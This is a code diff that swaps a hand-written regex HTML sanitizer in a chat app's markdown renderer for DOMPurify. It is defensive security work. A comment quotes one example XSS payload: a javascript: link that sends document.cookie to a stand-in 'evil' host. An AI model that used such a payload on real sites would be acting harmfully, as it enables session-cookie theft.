@@ -2,6 +2,7 @@
 // and the Message bubble itself.
 import React from 'react';
 import { marked } from 'marked';
+import DOMPurify from 'dompurify';
 import hljs from 'highlight.js';
 import { L, Icons } from '../../components.jsx';
 import { RouteChip } from './badges.jsx';
@@ -49,11 +50,17 @@ export function ThinkToggle({ reasoning }) {
 }
 
 // ── Markdown rendering ─────────────────────────────────────────────────────────
+// SECURITY (found in review, 2026-08-11): this used to be a hand-rolled
+// regex ("safeHtml") that stripped <script> tags and on*= event-handler
+// attributes but never touched href/src URL schemes — a markdown link like
+// [click](javascript:fetch('https://evil/'+document.cookie)) rendered
+// straight through into dangerouslySetInnerHTML untouched. Per this repo's
+// own owasp-llm-output-law.md (LLM02: sanitize LLM/markdown output before
+// render — DOMPurify, not a regex), replaced with real sanitization.
+// DOMPurify blocks javascript:/vbscript:/data:-for-non-image URLs in
+// href/src by default; no extra config needed for that part.
 export function safeHtml(html) {
-  return html
-    .replace(/<script[\s\S]*?<\/script>/gi, "")
-    .replace(/ on\w+\s*=\s*["'][^"']*["']/gi, "")
-    .replace(/ on\w+\s*=\s*[^\s>]*/gi, "");
+  return DOMPurify.sanitize(html);
 }
 export function renderMd(text) {
   if (!text) return "";
